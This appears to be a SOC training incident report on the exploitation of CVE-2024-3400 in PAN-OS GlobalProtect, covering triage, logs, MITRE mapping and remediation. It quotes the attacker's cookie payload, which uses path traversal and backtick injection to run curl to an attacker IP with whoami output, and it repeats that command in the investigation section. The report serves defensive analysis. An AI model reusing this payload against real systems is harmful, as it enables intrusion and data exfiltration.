# Incident Report 6 — PAN-OS Command Injection Exploitation (CVE-2024-3400)

## 1. Alert Summary

- **Alert Name:** PAN-OS Command Injection Vulnerability Exploitation
- **Severity:** Critical
- **Date:** Apr 18, 2024
- **Source:** LetsDefend SIEM

---

## 2. Initial Triage

The alert was triggered due to a malicious HTTP request containing command injection patterns within a session cookie targeting the GlobalProtect VPN endpoint.

The payload structure indicates exploitation of **CVE-2024-3400**, a known PAN-OS command injection vulnerability.

---

## 3. Key Indicators

- **Target Host:** PA-Firewall-01 (172.16.17.139)
- **Source IP:** 144.172.79.92
- **URL:** /global-protect/login.esp
- **HTTP Method:** POST
- **Malicious Payload (Cookie):**

```bash
SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)
```

---

## 4. Investigation

### 4.1 Web Request Analysis

- Malicious POST requests observed targeting GlobalProtect endpoint
- Cookie contains:
  - Path traversal (`../../../`)
  - Command injection using backticks

- Payload attempts to execute `curl` command to attacker server

---

### 4.2 Log Analysis

Multiple logs confirm attacker activity:

- Requests from IP `144.172.79.92` using `curl/8.4.0`
- Access to:
  - `/global-protect/login.esp`
  - `/global-protect/logout.esp`

Indicates automated exploitation attempts.

---

### 4.3 Command Execution Evidence

System logs (`dt_send`) confirm execution flow:

- Telemetry service processes attacker-controlled filename
- Injected command is executed:
  - `curl 144.172.79.92:4444?user=$(whoami)`

This confirms **command execution on the system**.

---

### 4.4 Exfiltration Attempt

- System attempts outbound connection to attacker IP
- Log shows:
  - Destination: 144.172.79.92
  - Command executed via `dt_curl`

Final result:

- DNS lookup failure → exfiltration likely unsuccessful

---

### 4.5 Attack Technique

- Exploitation of PAN-OS vulnerability (CVE-2024-3400)
- Path traversal used to write malicious input
- Command injection executed via telemetry service
- Attempted data exfiltration via curl

---

### 4.6 Attack Timeline

1. Attacker sends crafted POST request to VPN endpoint
2. Malicious cookie injected with command payload
3. System processes payload via telemetry service
4. Command execution triggered (`curl`)
5. Outbound connection attempted to attacker server
6. Exfiltration fails due to DNS error

---

## 5. Findings

- Command injection successfully executed
- System processed attacker-controlled input
- Outbound communication attempt confirms execution
- Exfiltration attempt detected but unsuccessful

---

## 6. Verdict

**True Positive**

Confirmed exploitation of CVE-2024-3400 with successful command execution on target system.

---

## 7. MITRE ATT&CK Mapping

- **T1190** — Exploit Public-Facing Application
- **T1059** — Command and Scripting Interpreter
- **T1046** — Network Service Discovery
- **T1041** — Exfiltration Over C2 Channel

---

## 8. Response Actions

- Immediate escalation to Tier 2
- Investigation of affected firewall system initiated

---

## 9. Recommended Actions

- Immediately patch PAN-OS to latest version
- Isolate management interface
- Review `/opt/panlogs/tmp/` for persistence artifacts
- Block attacker IP at network perimeter
- Conduct full integrity check of firewall

---

## 10. Conclusion

A command injection vulnerability in PAN-OS (CVE-2024-3400) was successfully exploited via a crafted HTTP request. The attacker achieved command execution and attempted data exfiltration. Immediate remediation and system validation are required to ensure no persistence mechanisms remain.
